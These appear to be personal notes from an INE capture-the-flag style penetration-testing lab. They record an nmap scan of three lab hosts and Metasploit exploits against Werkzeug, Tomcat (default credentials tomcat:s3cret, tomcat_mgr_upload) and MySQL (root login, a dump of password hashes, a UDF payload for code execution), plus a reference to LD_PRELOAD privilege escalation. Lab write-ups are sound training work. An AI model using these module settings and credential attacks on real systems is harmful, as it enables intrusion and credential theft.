 server1.ine.local (192.174.120.3)                                        

server2.ine.local (192.174.120.4)                         

server3.ine.local 192.174.120.5

Nmap 7.92 scan initiated Thu Nov 24 20:42:42 2022 as: nmap -sC -sV -v -oA scan 192.174.120.3-5
Nmap scan report for server1.ine.local (192.174.120.3)


80/tcp open  http    Werkzeug httpd 0.9.6 (Python 2.7.13)

|_http-server-header: Werkzeug/0.9.6 Python/2.7.13
MAC Address: 02:42:C0:AE:78:03 (Unknown)

server2.ine.local (192.174.120.4)
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1


Nmap scan report for server3.ine.local (192.174.120.5)

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1


# Server1.ine.local
server using Werkzeug there is a known CVE for this service on metasploit
running metasploit 
and we got a shell back
![[Pasted image 20221124172343.png]]
![[Pasted image 20221124172358.png]]
we are in as root and get the flag

running post exploit module 
post/linux/gather/enum_users_history
![[Pasted image 20221124181622.png]]
found
```bash
/root/.msf4/loot/20221124214618_default_192.174.120.3_linux.enum.users_570773.txt


```
![[Pasted image 20221124181840.png]]


# Server3.ine.local
Server is running tomcat
trying default tomcat creds
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
and tomcat:s3cret is a success 
now we can use metasploit module exploit/multi/http/tomcat_mgr_upload
to get a shell on the server


```ruby

use exploit/multi/http/tomcat_mgr_upload

set HttpPassword s3cret
set HttpUsername tomcat
set lport eth1
set rhosts server3.ine.local

```



![[Pasted image 20221124173009.png]]
![[Pasted image 20221124173635.png]]

now we can try to priv esc

inside tomcats directory we found a zipped conf file
and user creds

![[Pasted image 20221124183944.png]]

sudo -l 
![[Pasted image 20221124185059.png]]
https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/
using this blog we can priv esc our way to root


# Server2.ine.local

mysql -h 192.174.120.4 -u root -pfArFLP29UySm4bZj
![[Pasted image 20221124181932.png]]
![[Pasted image 20221124182125.png]]
```
root:*33E1596219194808AFC67BCEA0F5195B86ABAA48
filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
debian-sys-maint:*75916EC266546FFAF6976B0EF6C2FCB64EC0EFD3
```
running metasploit module to get RCE on the target 
```
use exploit/multi/mysql/mysql_udf_payload
set target 1
```
![[Pasted image 20221124183110.png]]
and get the flag